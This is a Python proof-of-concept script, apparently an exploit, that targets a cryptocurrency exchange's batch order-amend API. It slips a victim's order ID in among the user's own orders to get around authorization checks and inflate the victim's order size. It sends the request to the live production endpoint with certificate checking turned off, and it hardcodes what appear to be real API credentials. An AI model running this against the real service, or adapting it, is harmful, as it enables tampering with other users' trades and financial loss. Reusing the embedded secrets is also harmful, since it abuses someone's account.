#!/usr/bin/env python3
"""
Bybit Batch Order Race Condition Exploit (PoC)
Target: /v5/order/amend-batch
Logic: Mix valid orders with one victim order to bypass auth checks.
"""
import requests
import time
import hmac
import hashlib
import json
import uuid

# --- CONFIGURATION ---
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

# 1. Place 5 dummy limit orders first to get these IDs!
# 2. Find a target ID (or use a random UUID to test for "Order not found" vs "Permission denied")
MY_VALID_ORDER_IDS = [
    "fill_with_real_id_1",
    "fill_with_real_id_2",
    "fill_with_real_id_3",
    "fill_with_real_id_4",
    "fill_with_real_id_5"
]
TARGET_ORDER_ID = str(uuid.uuid4()) # Random for testing, replace with victim ID

def get_signature(payload):
    timestamp = str(int(time.time() * 1000))
    recv_window = "5000"
    param_str = payload
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{param_str}"
    signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()
    return {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
        "Content-Type": "application/json"
    }

def exploit():
    print(f"[*] Preparing Batch Exploit...")
    
    # Construct mixed payload
    requests_list = []
    
    # Add valid orders
    for oid in MY_VALID_ORDER_IDS:
        requests_list.append({
            "symbol": "BTCUSDT",
            "orderId": oid,
            "qty": "0.001" # Trivial update
        })
        
    # Add TARGET order (The Malicious Payload)
    requests_list.append({
        "symbol": "BTCUSDT",
        "orderId": TARGET_ORDER_ID,
        "qty": "1000" # Malicious update
    })
    
    payload = {
        "category": "linear",
        "request": requests_list
    }
    
    json_payload = json.dumps(payload)
    headers = get_signature(json_payload)
    
    print(f"[*] Sending Batch Request with {len(requests_list)} items...", flush=True)
    try:
        r = requests.post(f"{BASE_URL}/v5/order/amend-batch", data=json_payload, headers=headers, verify=False, timeout=10)
        print(f"\nStatus: {r.status_code}", flush=True)
        print(f"Response: {r.text}", flush=True)
        
        if "retCode" in r.text and r.json().get("retCode") == 0:
            print("\n[+] SUCCESS? Check if target order was modified!")
            result_list = r.json().get("result", {}).get("list", [])
            for res in result_list:
                print(f"   - Order {res.get('orderId')}: Code {res.get('code')} Msg {res.get('msg')}")
                
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
